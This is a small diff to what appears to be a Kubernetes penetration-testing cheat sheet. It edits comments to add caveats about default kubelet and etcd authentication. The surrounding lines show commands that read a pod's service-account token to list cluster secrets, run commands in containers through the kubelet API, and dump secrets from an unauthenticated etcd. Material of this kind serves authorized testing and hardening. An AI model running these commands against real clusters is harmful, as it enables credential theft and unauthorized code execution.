@@ -53,7 +53,7 @@ curl -k https://<target>:8443/version
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets
 
-# kubelet API (10250)
+# kubelet API (10250): /pods is anonymous-open only if --anonymous-auth=true (disabled by default since K8s 1.19)
 curl -k https://<target>:10250/pods
 curl -k https://<target>:10250/run/<namespace>/<pod>/<container> -d "cmd=id"
 ```
@@ -87,7 +87,7 @@ EOF
 
 ## etcd (2379)
 ```bash
-# Unauthenticated etcd — contains all K8s secrets
+# Unauthenticated etcd (client-cert auth is enforced by default; only if disabled) — contains all K8s secrets
 etcdctl --endpoints=http://<target>:2379 get / --prefix --keys-only
 etcdctl --endpoints=http://<target>:2379 get /registry/secrets --prefix
 ```
